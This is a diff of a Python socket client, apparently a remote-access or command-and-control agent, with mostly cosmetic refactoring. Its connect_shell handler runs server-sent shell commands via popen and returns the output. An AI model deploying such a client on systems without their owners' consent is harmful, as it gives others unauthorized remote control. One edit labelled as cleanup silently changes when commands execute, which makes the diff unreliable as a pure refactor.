@@ -11,11 +11,7 @@ import logging, hashlib
 logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s")
 logg = logging.getLogger(__name__)
 
-if os.name == "nt":
-	ENCODING = "windows-1252"
-else:
-	ENCODING = "utf-8"
-
+ENCODING = "windows-1252" if os.name == "nt" else "utf-8"
 AUTHORIZATION = "" # (optnal) Set this to the authorization token you want to use
 MAX_CHUNK_SIZE = 16 * 1024 # 16KB
 POPEN_TIMEOUT = 60 # seconds
@@ -38,16 +34,16 @@ class Request:
 				self.body = {"output": "", **body}
 			else:
 				self.body = {"output": send, **body}
-		
+
 		elif isinstance(body, bytes):
 			self.header["ct"] = "BYTES"
 			self.body = body
-		
+
 		elif isinstance(body, object):
 			self.header["ct"] = "FILE"
 			self.body = body
 
-		self.header = {**self.header, **header}
+		self.header |= header
 
 	
 	def __str__(self):
@@ -295,12 +291,7 @@ class Client():
 
 	def recv(self) -> Response:
 		data = self.conn.recv(MAX_CHUNK_SIZE)
-		if not data:
-			return None
-
-		res = Response(data)
-
-		return res
+		return None if not data else Response(data)
 
 	def start(self) -> None:
 		while True:
@@ -343,7 +334,7 @@ class Client():
 		self.tasks[hash]["manager"] = manager
 
 		if ack:
-			self.send(Request("Task started successfully {}".format(hash)))
+			self.send(Request(f"Task started successfully {hash}"))
 	
 	def direct_ping(self, ack:str, params:str) -> None:
 		if ack:
@@ -354,10 +345,9 @@ class Client():
 		if hash in self.tasks:
 			self.tasks[hash]["manager"].run_until_local = False
 			if ack:
-				self.send(Request("Task killed successfully {}".format(hash)))
-		else:
-			if ack:
-				self.send(Request("Task not found {}".format(hash)))
+				self.send(Request(f"Task killed successfully {hash}"))
+		elif ack:
+			self.send(Request(f"Task not found {hash}"))
 	
 	def direct_stop(self, ack:str, params:str) -> None:
 		for hash in self.tasks:
@@ -381,8 +371,8 @@ class Client():
 			self.send(Request("Invalid command"))
 	
 	def connect_shell(self, ack:str, params:str) -> None:
-		output = self.popen(cmd=params)
 		if ack:
+			output = self.popen(cmd=params)
 			self.send(Request(body=output))
 
 	def connect_download(self, ack:str, params:str) -> None:
@@ -406,8 +396,7 @@ class Client():
 		finally:
 			timer.cancel()
 
-		final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
-		return final_output
+		return output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
 
 	def get_hash(self, *args):
 		data = []
